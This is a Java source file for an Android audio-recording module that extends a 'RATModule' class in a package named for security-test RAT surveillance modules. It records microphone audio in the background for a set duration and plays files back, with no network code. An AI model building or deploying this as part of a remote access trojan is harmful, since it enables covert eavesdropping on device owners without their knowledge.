package com.security.test.rat.modules.surveillance;

import android.content.Context;
import android.media.MediaRecorder;
import android.media.MediaPlayer;
import android.util.Log;

import java.io.File;
import java.io.IOException;

/**
 * AudioModule - Implements audio recording functionality
 * 
 * Features:
 * - Audio recording with configurable quality
 * - Duration control
 * - File format selection
 * - Background recording
 */
public class AudioModule extends RATModule {
    
    private static final String TAG = "AudioModule";
    
    private Context context;
    private MediaRecorder mediaRecorder;
    private MediaPlayer mediaPlayer;
    private String currentRecordingPath;
    private boolean isRecording = false;
    private boolean isInitialized = false;
    
    // Recording configuration
    private int audioSource = MediaRecorder.AudioSource.MIC;
    private int outputFormat = MediaRecorder.OutputFormat.MPEG_4;
    private int audioEncoder = MediaRecorder.AudioEncoder.AAC;
    private int bitRate = 128000; // 128 kbps
    private int sampleRate = 44100; // 44.1 kHz
    private int channels = 1; // Mono
    
    public AudioModule(Context context) {
        super("AudioModule", "Audio recording and surveillance");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing AudioModule");
            
            // Check if we have recording permission
            if (context.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Audio recording permission not granted");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "AudioModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize AudioModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            stopRecording();
            
            if (mediaPlayer != null) {
                mediaPlayer.release();
                mediaPlayer = null;
            }
            
            isInitialized = false;
            Log.i(TAG, "AudioModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during AudioModule cleanup", e);
        }
    }
    
    /**
     * Start audio recording
     */
    public boolean startRecording(String outputPath, int durationSeconds) {
        if (!isInitialized) {
            Log.e(TAG, "AudioModule not initialized");
            return false;
        }
        
        if (isRecording) {
            Log.w(TAG, "Already recording, stopping current recording first");
            stopRecording();
        }
        
        try {
            Log.i(TAG, "Starting audio recording, output: " + outputPath + ", duration: " + durationSeconds + "s");
            
            // Create output directory if it doesn't exist
            File outputFile = new File(outputPath);
            File parentDir = outputFile.getParentFile();
            if (parentDir != null && !parentDir.exists()) {
                parentDir.mkdirs();
            }
            
            // Initialize MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(audioSource);
            mediaRecorder.setOutputFormat(outputFormat);
            mediaRecorder.setAudioEncoder(audioEncoder);
            mediaRecorder.setAudioChannels(channels);
            mediaRecorder.setAudioSamplingRate(sampleRate);
            mediaRecorder.setAudioEncodingBitRate(bitRate);
            mediaRecorder.setOutputFile(outputPath);
            
            // Prepare and start recording
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;
            currentRecordingPath = outputPath;
            
            // Schedule stop recording after duration
            if (durationSeconds > 0) {
                new android.os.Handler().postDelayed(this::stopRecording, durationSeconds * 1000L);
            }
            
            Log.i(TAG, "Audio recording started successfully");
            return true;
            
        } catch (IOException e) {
            Log.e(TAG, "Failed to start audio recording", e);
            cleanupRecorder();
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error starting audio recording", e);
            cleanupRecorder();
            return false;
        }
    }
    
    /**
     * Stop audio recording
     */
    public boolean stopRecording() {
        if (!isRecording || mediaRecorder == null) {
            return false;
        }
        
        try {
            Log.i(TAG, "Stopping audio recording");
            
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            
            isRecording = false;
            
            Log.i(TAG, "Audio recording stopped, saved to: " + currentRecordingPath);
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording", e);
            cleanupRecorder();
            return false;
        }
    }
    
    /**
     * Play recorded audio file
     */
    public boolean playAudio(String audioPath) {
        if (!isInitialized) {
            Log.e(TAG, "AudioModule not initialized");
            return false;
        }
        
        try {
            Log.i(TAG, "Playing audio file: " + audioPath);
            
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
            
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(audioPath);
            mediaPlayer.prepare();
            mediaPlayer.start();
            
            Log.i(TAG, "Audio playback started");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to play audio", e);
            return false;
        }
    }
    
    /**
     * Stop audio playback
     */
    public void stopPlayback() {
        if (mediaPlayer != null && mediaPlayer.isPlaying()) {
            mediaPlayer.stop();
            mediaPlayer.release();
            mediaPlayer = null;
            Log.i(TAG, "Audio playback stopped");
        }
    }
    
    /**
     * Set audio quality settings
     */
    public void setAudioQuality(int bitRate, int sampleRate, int channels) {
        this.bitRate = bitRate;
        this.sampleRate = sampleRate;
        this.channels = channels;
        Log.i(TAG, String.format("Audio quality set: %d kbps, %d Hz, %d channels", 
            bitRate / 1000, sampleRate, channels));
    }
    
    /**
     * Get current recording status
     */
    public boolean isRecording() {
        return isRecording;
    }
    
    /**
     * Get current recording path
     */
    public String getCurrentRecordingPath() {
        return currentRecordingPath;
    }
    
    /**
     * Get audio file information
     */
    public String getAudioFileInfo(String audioPath) {
        try {
            File audioFile = new File(audioPath);
            if (!audioFile.exists()) {
                return "Audio file not found";
            }
            
            long fileSize = audioFile.length();
            long duration = getAudioDuration(audioPath);
            
            return String.format("File: %s, Size: %.2f MB, Duration: %d seconds", 
                audioFile.getName(), fileSize / (1024.0 * 1024.0), duration);
                
        } catch (Exception e) {
            Log.e(TAG, "Failed to get audio file info", e);
            return "Audio file info unavailable";
        }
    }
    
    /**
     * Get audio duration in seconds
     */
    private long getAudioDuration(String audioPath) {
        try {
            MediaPlayer player = new MediaPlayer();
            player.setDataSource(audioPath);
            player.prepare();
            long duration = player.getDuration() / 1000; // Convert to seconds
            player.release();
            return duration;
        } catch (Exception e) {
            Log.e(TAG, "Failed to get audio duration", e);
            return 0;
        }
    }
    
    /**
     * Clean up MediaRecorder resources
     */
    private void cleanupRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.release();
            } catch (Exception e) {
                Log.w(TAG, "Error releasing MediaRecorder", e);
            }
            mediaRecorder = null;
        }
        isRecording = false;
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        if (isRecording) {
            return "Recording to: " + currentRecordingPath;
        }
        
        return "Ready";
    }
}
